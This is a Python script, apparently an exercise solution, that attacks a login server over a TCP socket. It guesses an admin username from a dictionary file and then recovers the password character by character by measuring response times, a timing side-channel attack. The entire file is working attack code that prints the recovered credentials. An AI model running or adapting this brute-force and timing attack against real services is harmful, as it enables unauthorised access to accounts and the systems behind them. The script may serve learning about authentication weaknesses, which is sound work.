# write your code here
from datetime import datetime
import argparse
import json
import socket
import string


def test_credentials(sock, login, password):
    credentials = {"login": login, "password": password}
    sock.send(json.dumps(credentials).encode())
    response = sock.recv(1024)
    return json.loads(response.decode())


def read_dictionary(filename):
    with open(filename, 'r') as infile:
        for line in infile:
            yield line.rstrip('\n')


def main(args):
    with socket.socket() as testsock:
        address = (args.host, args.port)
        testsock.connect(address)

        difference = 0

        adminlogin = ""
        testlogins = read_dictionary(args.admin)
        for testlogin in testlogins:
            start = datetime.now()
            reply = test_credentials(testsock, testlogin, " ")
            finish = datetime.now()
            if reply['result'] == "Wrong password!":
                difference = finish - start
                adminlogin = testlogin
                break

        adminpass = ""
        if adminlogin != "":
            characters = [c for c in string.ascii_letters] + [str(n) for n in range(10)]
            password = ""
            success = False
            while not success:
                for char in characters:
                    start = datetime.now()
                    reply = test_credentials(testsock, adminlogin, password + char)
                    finish = datetime.now()
                    if reply['result'] == "Connection success!":
                        adminpass = password + char
                        success = True
                        break
                    elif reply['result'] == "Wrong password!":
                        if finish - start > difference * 100:
                            password += char
                            break

        creds = {"login": adminlogin, "password": adminpass}
        print(json.dumps(creds))


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('host', help="server hostname")
    parser.add_argument('port', help="server port number", type=int)
    parser.add_argument('-a', '--admin', help="dictionary of typical admin logins", default="logins.txt")
    parser.add_argument('-p', '--paswd', help="dictionary of typical passwords", default="passwords.txt")
    main(parser.parse_args())
